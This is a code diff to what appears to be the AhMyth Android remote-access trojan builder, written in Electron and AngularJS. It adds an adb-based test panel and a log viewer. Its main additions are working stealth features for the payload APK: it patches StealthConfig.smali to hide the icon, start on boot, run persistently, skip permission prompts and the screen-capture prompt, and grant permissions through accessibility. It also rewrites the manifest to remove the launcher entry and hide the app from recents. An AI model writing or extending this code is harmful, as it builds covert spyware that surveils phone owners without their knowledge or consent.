@@ -305,6 +305,278 @@ app.controller("AppCtrl", ($scope, $sce) => {
     // Initialize payloads list
     $appCtrl.refreshPayloads();
 
+    // ========== TEST SUITE CONTROLLER ==========
+    $appCtrl.testConfig = {
+        deviceId: '',
+        serverIP: '192.168.0.180',
+        port: 1234,
+        autoBuild: true,
+        forceRebuild: true,
+        onlyFailing: false
+    };
+    
+    $appCtrl.availableDevices = [];
+    $appCtrl.isRunning = false;
+    $appCtrl.outputLines = [];
+    $appCtrl.testStats = {
+        total: 0,
+        passed: 0,
+        failed: 0
+    };
+    $appCtrl.testResults = [];
+    $appCtrl.testProcess = null;
+
+    // Refresh ADB devices
+    $appCtrl.refreshDevices = async () => {
+        try {
+            const { exec } = require('child_process');
+            const { promisify } = require('util');
+            const execAsync = promisify(exec);
+            
+            const { stdout } = await execAsync('adb devices');
+            const lines = stdout.split('\n').filter(l => l.trim() && !l.includes('List of devices'));
+            const devices = [];
+            
+            for (const line of lines) {
+                const parts = line.trim().split(/\s+/);
+                if (parts.length >= 2 && parts[1] === 'device') {
+                    const deviceId = parts[0];
+                    // Try to get device model
+                    try {
+                        const { stdout: model } = await execAsync(`adb -s ${deviceId} shell getprop ro.product.model`).catch(() => ({ stdout: 'Unknown' }));
+                        const { stdout: android } = await execAsync(`adb -s ${deviceId} shell getprop ro.build.version.release`).catch(() => ({ stdout: 'Unknown' }));
+                        devices.push({
+                            id: deviceId,
+                            name: `${model.toString().trim()} (Android ${android.toString().trim()})`
+                        });
+                    } catch (e) {
+                        devices.push({
+                            id: deviceId,
+                            name: deviceId
+                        });
+                    }
+                }
+            }
+            
+            $appCtrl.availableDevices = devices;
+            if (!$appCtrl.$$phase) $appCtrl.$apply();
+        } catch (e) {
+            console.error('Error refreshing devices:', e);
+            $appCtrl.addOutput('Error refreshing devices: ' + e.message, 'error');
+        }
+    };
+
+    // Add output line
+    $appCtrl.addOutput = (content, type = 'info') => {
+        const time = new Date().toLocaleTimeString();
+        $appCtrl.outputLines.push({ time, content, type });
+        // Keep only last 1000 lines
+        if ($appCtrl.outputLines.length > 1000) {
+            $appCtrl.outputLines.shift();
+        }
+        // Auto-scroll to bottom
+        setTimeout(() => {
+            const outputEl = document.getElementById('testOutput');
+            if (outputEl) {
+                outputEl.scrollTop = outputEl.scrollHeight;
+            }
+        }, 100);
+        if (!$appCtrl.$$phase) $appCtrl.$apply();
+    };
+
+    // Clear output
+    $appCtrl.clearOutput = () => {
+        $appCtrl.outputLines = [];
+        $appCtrl.testResults = [];
+        $appCtrl.testStats = { total: 0, passed: 0, failed: 0 };
+        if (!$appCtrl.$$phase) $appCtrl.$apply();
+    };
+
+    // Start tests
+    $appCtrl.startTests = () => {
+        if ($appCtrl.isRunning) return;
+        
+        $appCtrl.isRunning = true;
+        $appCtrl.clearOutput();
+        $appCtrl.addOutput('Starting comprehensive test suite...', 'info');
+        
+        // Send IPC message to main process
+        ipcRenderer.send('test-suite:start', $appCtrl.testConfig);
+    };
+
+    // Stop tests
+    $appCtrl.stopTests = () => {
+        if (!$appCtrl.isRunning) return;
+        
+        $appCtrl.addOutput('Stopping tests...', 'warn');
+        ipcRenderer.send('test-suite:stop');
+    };
+
+    // Listen for test output from main process
+    ipcRenderer.on('test-suite:output', (event, data) => {
+        $appCtrl.addOutput(data.message, data.type || 'info');
+    });
+
+    // Listen for test result
+    ipcRenderer.on('test-suite:result', (event, result) => {
+        $appCtrl.testResults.push(result);
+        if (result.success) {
+            $appCtrl.testStats.passed++;
+        } else {
+            $appCtrl.testStats.failed++;
+        }
+        $appCtrl.testStats.total = $appCtrl.testResults.length;
+        if (!$appCtrl.$$phase) $appCtrl.$apply();
+    });
+
+    // Listen for test statistics update
+    ipcRenderer.on('test-suite:stats', (event, stats) => {
+        $appCtrl.testStats = stats;
+        if (!$appCtrl.$$phase) $appCtrl.$apply();
+    });
+
+    // Listen for test completion
+    ipcRenderer.on('test-suite:complete', (event, stats) => {
+        $appCtrl.isRunning = false;
+        if (stats && stats.total > 0) {
+            $appCtrl.testStats = stats;
+        }
+        $appCtrl.addOutput(`\nTest suite completed. Total: ${$appCtrl.testStats.total}, Passed: ${$appCtrl.testStats.passed}, Failed: ${$appCtrl.testStats.failed}`, 
+                          $appCtrl.testStats.failed === 0 ? 'success' : 'error');
+        if (!$appCtrl.$$phase) $appCtrl.$apply();
+    });
+
+    // Listen for test error
+    ipcRenderer.on('test-suite:error', (event, error) => {
+        $appCtrl.isRunning = false;
+        $appCtrl.addOutput('Error: ' + error.message, 'error');
+        if (!$appCtrl.$$phase) $appCtrl.$apply();
+    });
+
+    // Initialize devices on load
+    setTimeout(() => {
+        $appCtrl.refreshDevices();
+    }, 1000);
+
+    // ========== REQUEST/RESPONSE LOGS CONTROLLER ==========
+    $appCtrl.requestLogs = [];
+    $appCtrl.autoScrollLogs = true;
+    $appCtrl.logFilters = {
+        request: true,
+        response: true,
+        info: true,
+        error: true
+    };
+    
+    // Log filter function
+    $appCtrl.logFilter = (log) => {
+        return $appCtrl.logFilters[log.type] !== false;
+    };
+    
+    // Get log count by type
+    $appCtrl.getLogCount = (type) => {
+        return $appCtrl.requestLogs.filter(l => l.type === type).length;
+    };
+    
+    // Clear request logs
+    $appCtrl.clearRequestLogs = () => {
+        $appCtrl.requestLogs = [];
+        if (!$appCtrl.$$phase) $appCtrl.$apply();
+    };
+    
+    // Toggle auto-scroll
+    $appCtrl.toggleAutoScroll = () => {
+        $appCtrl.autoScrollLogs = !$appCtrl.autoScrollLogs;
+        if ($appCtrl.autoScrollLogs) {
+            $appCtrl.scrollLogsToBottom();
+        }
+    };
+    
+    // Apply log filters
+    $appCtrl.applyLogFilters = () => {
+        if (!$appCtrl.$$phase) $appCtrl.$apply();
+    };
+    
+    // Toggle log data expansion
+    $appCtrl.toggleLogData = (index) => {
+        if ($appCtrl.requestLogs[index]) {
+            $appCtrl.requestLogs[index].expanded = !$appCtrl.requestLogs[index].expanded;
+            if (!$appCtrl.$$phase) $appCtrl.$apply();
+        }
+    };
+    
+    // Scroll logs to bottom
+    $appCtrl.scrollLogsToBottom = () => {
+        setTimeout(() => {
+            const logsContent = document.getElementById('logsContent');
+            if (logsContent) {
+                logsContent.scrollTop = logsContent.scrollHeight;
+            }
+        }, 100);
+    };
+    
+    // Add log entry
+    $appCtrl.addRequestLog = (logEntry) => {
+        const time = new Date().toLocaleTimeString();
+        $appCtrl.requestLogs.push({
+            time: time,
+            type: logEntry.type || 'info',
+            deviceId: logEntry.deviceId || '',
+            command: logEntry.command || '',
+            data: logEntry.data || '',
+            expanded: false
+        });
+        
+        // Keep only last 1000 entries
+        if ($appCtrl.requestLogs.length > 1000) {
+            $appCtrl.requestLogs.shift();
+        }
+        
+        // Auto-scroll if enabled
+        if ($appCtrl.autoScrollLogs) {
+            $appCtrl.scrollLogsToBottom();
+        }
+        
+        if (!$appCtrl.$$phase) $appCtrl.$apply();
+    };
+    
+    // Listen for log events from main process
+    ipcRenderer.on('log:request', (event, data) => {
+        $appCtrl.addRequestLog({
+            type: 'request',
+            deviceId: data.deviceId,
+            command: data.command,
+            data: data.data ? JSON.stringify(data.data, null, 2) : ''
+        });
+    });
+    
+    ipcRenderer.on('log:response', (event, data) => {
+        $appCtrl.addRequestLog({
+            type: 'response',
+            deviceId: data.deviceId,
+            command: data.command,
+            data: data.data ? JSON.stringify(data.data, null, 2) : ''
+        });
+    });
+    
+    ipcRenderer.on('log:info', (event, data) => {
+        $appCtrl.addRequestLog({
+            type: 'info',
+            deviceId: '',
+            command: '',
+            data: data.message || ''
+        });
+    });
+    
+    ipcRenderer.on('log:error', (event, data) => {
+        $appCtrl.addRequestLog({
+            type: 'error',
+            deviceId: '',
+            command: '',
+            data: data.message || ''
+        });
+    });
+
     // Convert country code to flag image (works on all OS including Windows)
     $appCtrl.getCountryFlag = (countryCode) => {
         const flag = countryCodeToFlag(countryCode);
@@ -680,6 +952,145 @@ app.controller("AppCtrl", ($scope, $sce) => {
         }
     }
 
+    // Function to apply stealth and permission options to StealthConfig.smali
+    async function applyStealthConfigToSmali(apkFolder) {
+        const stealthConfigPaths = [
+            dir.join(apkFolder, 'smali', 'ahmyth', 'mine', 'king', 'ahmyth', 'StealthConfig.smali'),
+            dir.join(apkFolder, 'smali_classes2', 'ahmyth', 'mine', 'king', 'ahmyth', 'StealthConfig.smali'),
+            dir.join(apkFolder, 'smali_classes3', 'ahmyth', 'mine', 'king', 'ahmyth', 'StealthConfig.smali')
+        ];
+        
+        let stealthConfigPath = null;
+        for (const path of stealthConfigPaths) {
+            if (fs.existsSync(path)) {
+                stealthConfigPath = path;
+                break;
+            }
+        }
+        
+        if (!stealthConfigPath) {
+            delayedLog('[⚠] StealthConfig.smali not found, skipping stealth config modification', CONSTANTS.logStatus.WARNING);
+            return;
+        }
+        
+        try {
+            delayedLog('[→] Modifying StealthConfig.smali...', CONSTANTS.logStatus.INFO);
+            let smaliContent = await fs.promises.readFile(stealthConfigPath, 'utf8');
+            
+            // Map GUI options to StealthConfig fields
+            const stealthMappings = {
+                'HIDE_ICON': $appCtrl.stealthOptions?.hideIcon ?? true,
+                'HIDE_FROM_RECENTS': $appCtrl.stealthOptions?.hideFromRecents ?? false,
+                'START_ON_BOOT': $appCtrl.stealthOptions?.startOnBoot ?? true,
+                'SILENT_NOTIFICATION': $appCtrl.stealthOptions?.silentNotification ?? false,
+                'PERSISTENT_SERVICE': $appCtrl.stealthOptions?.persistentService ?? true,
+                'WAKE_LOCK': $appCtrl.stealthOptions?.wakelock ?? true,
+                'AUTO_CLOSE_ACTIVITY': false, // Default to false for better UX
+                'UNINSTALL_PROTECTION': false, // Default to false
+                'SKIP_PERMISSION_PROMPTS': $appCtrl.silentPermOptions?.skipPrompts ?? false,
+                'USE_ACCESSIBILITY_GRANTER': $appCtrl.silentPermOptions?.useAccessibility ?? false,
+                'DEVICE_OWNER_MODE': $appCtrl.silentPermOptions?.deviceOwner ?? false,
+                'ADB_GRANT_MODE': $appCtrl.silentPermOptions?.generateAdbScript ?? true,
+                'SKIP_SPECIAL_PERMISSIONS': false,
+                'MINIMAL_PERMISSIONS_ONLY': false,
+                'SILENT_PERMISSION_MODE': $appCtrl.silentPermOptions?.skipPrompts ?? false,
+                'SKIP_SCREEN_CAPTURE_PROMPT': true,
+                'AUTO_REQUEST_SCREEN_CAPTURE': false
+            };
+            
+            let modifiedCount = 0;
+            
+            // Replace boolean values in smali format
+            for (const [fieldName, value] of Object.entries(stealthMappings)) {
+                const boolValue = value ? '0x1' : '0x0';
+                const boolStr = value ? 'true' : 'false';
+                let found = false;
+                
+                // Pattern 1: Replace in .field declaration with = true/false (direct assignment)
+                const fieldPattern = new RegExp(`(\\.field public static final ${fieldName}:Z\\s*=\\s*)(true|false)`, 'g');
+                if (fieldPattern.test(smaliContent)) {
+                    smaliContent = smaliContent.replace(fieldPattern, `$1${boolStr}`);
+                    found = true;
+                    modifiedCount++;
+                    delayedLog(`[✓] Set ${fieldName} = ${boolStr}`, CONSTANTS.logStatus.SUCCESS);
+                    continue;
+                }
+                
+                // Pattern 2: Replace in <clinit> method - find const/4 before sput-boolean
+                // Look for: const/4 vX, 0x0 or 0x1 followed by sput-boolean for this field
+                const lines = smaliContent.split('\n');
+                let inClinit = false;
+                let clinitStart = -1;
+                let clinitEnd = -1;
+                
+                // Find <clinit> method boundaries
+                for (let i = 0; i < lines.length; i++) {
+                    if (lines[i].trim().startsWith('.method static constructor <clinit>()V')) {
+                        inClinit = true;
+                        clinitStart = i;
+                    }
+                    if (inClinit && lines[i].trim() === '.end method') {
+                        clinitEnd = i;
+                        break;
+                    }
+                }
+                
+                if (inClinit && clinitStart >= 0 && clinitEnd > clinitStart) {
+                    // Search within <clinit> for this field's assignment
+                    for (let i = clinitStart; i <= clinitEnd; i++) {
+                        // Look for sput-boolean with this field name
+                        if (lines[i].includes(`->${fieldName}:Z`)) {
+                            // Look backwards for const/4 instruction
+                            for (let j = i - 1; j >= clinitStart && j >= i - 5; j--) {
+                                const line = lines[j].trim();
+                                if (line.startsWith('const/4') && (line.includes('0x0') || line.includes('0x1'))) {
+                                    // Replace the const value
+                                    lines[j] = lines[j].replace(/0x[01]/g, boolValue);
+                                    found = true;
+                                    modifiedCount++;
+                                    delayedLog(`[✓] Set ${fieldName} = ${boolStr} (in <clinit>)`, CONSTANTS.logStatus.SUCCESS);
+                                    break;
+                                }
+                            }
+                            break;
+                        }
+                    }
+                    
+                    if (found) {
+                        smaliContent = lines.join('\n');
+                        continue;
+                    }
+                }
+                
+                // Pattern 3: Try to find any const/4 followed by sput-boolean for this field (anywhere in file)
+                const sputPattern = new RegExp(`(const/4\\s+v\\d+,\\s*)0x[01]([^\\n]*\\n[^\\n]*sput-boolean[^\\n]*->${fieldName}:Z)`, 'g');
+                if (sputPattern.test(smaliContent)) {
+                    smaliContent = smaliContent.replace(sputPattern, `$1${boolValue}$2`);
+                    found = true;
+                    modifiedCount++;
+                    delayedLog(`[✓] Set ${fieldName} = ${boolStr} (pattern match)`, CONSTANTS.logStatus.SUCCESS);
+                    continue;
+                }
+                
+                if (!found) {
+                    delayedLog(`[⚠] Could not find ${fieldName} in StealthConfig.smali`, CONSTANTS.logStatus.WARNING);
+                }
+            }
+            
+            // Write the modified content back
+            if (modifiedCount > 0) {
+                await fs.promises.writeFile(stealthConfigPath, smaliContent, 'utf8');
+                delayedLog(`[✓] StealthConfig.smali updated successfully (${modifiedCount} fields modified)`, CONSTANTS.logStatus.SUCCESS);
+            } else {
+                delayedLog('[⚠] No StealthConfig fields were modified', CONSTANTS.logStatus.WARNING);
+            }
+            
+        } catch (error) {
+            delayedLog(`[✗] Error modifying StealthConfig.smali: ${error.message}`, CONSTANTS.logStatus.FAIL);
+            throw error;
+        }
+    }
+
     // UNCOMMENT ORIGINAL CODE IF PROBLEMS ARISE.
     $appCtrl.GenerateApk = async (apkFolder) => {
         // Apply obfuscation if enabled
@@ -887,6 +1298,14 @@ app.controller("AppCtrl", ($scope, $sce) => {
                 delayedLog(`[ℹ] Error details saved to: ${logPath}`, CONSTANTS.logStatus.INFO);
                 return;
             }
+        }
+        
+        // Apply stealth and permission options to StealthConfig.smali (for both bound and non-bound APKs)
+        try {
+            await applyStealthConfigToSmali(apkFolder);
+        } catch (stealthError) {
+            delayedLog(`[⚠] Warning: Could not modify StealthConfig: ${stealthError.message}`, CONSTANTS.logStatus.WARNING);
+            // Continue with build even if stealth config modification fails
         }
 
         try {
@@ -1366,6 +1785,50 @@ echo "[!] Note: Some permissions may require manual approval on Android 10+"`;
             // Add the receiver and service tags to the application node
             manifestObj.application.receiver.push(receiverTag);
             manifestObj.application.service.push(serviceTag);
+            
+            // Apply stealth options to manifest (for bound APKs)
+            if ($appCtrl.stealthOptions && manifestObj.application && manifestObj.application.activity) {
+                const activities = Array.isArray(manifestObj.application.activity) 
+                    ? manifestObj.application.activity 
+                    : [manifestObj.application.activity];
+                
+                activities.forEach(activity => {
+                    // Hide from recents
+                    if ($appCtrl.stealthOptions.hideFromRecents) {
+                        if (!activity.$) activity.$ = {};
+                        activity.$['android:excludeFromRecents'] = 'true';
+                        activity.$['android:noHistory'] = 'true';
+                    }
+                    
+                    // Hide app icon - remove LAUNCHER category
+                    if ($appCtrl.stealthOptions.hideIcon && activity['intent-filter']) {
+                        const intentFilters = Array.isArray(activity['intent-filter']) 
+                            ? activity['intent-filter'] 
+                            : [activity['intent-filter']];
+                        
+                        intentFilters.forEach(filter => {
+                            if (filter.category) {
+                                const categories = Array.isArray(filter.category) 
+                                    ? filter.category 
+                                    : [filter.category];
+                                
+                                // Remove LAUNCHER category
+                                filter.category = categories.filter(cat => {
+                                    const name = cat.$ && cat.$['android:name'] ? cat.$['android:name'] : cat['android:name'];
+                                    return name !== 'android.intent.category.LAUNCHER';
+                                });
+                                
+                                // Add DEFAULT if no categories left
+                                if (filter.category.length === 0) {
+                                    filter.category = [{ $: { 'android:name': 'android.intent.category.DEFAULT' } }];
+                                }
+                            }
+                        });
+                    }
+                });
+                
+                delayedLog('[✓] Stealth options applied to manifest', CONSTANTS.logStatus.SUCCESS);
+            }
 
             const builder = new xml2js.Builder({
                 renderOpts: {
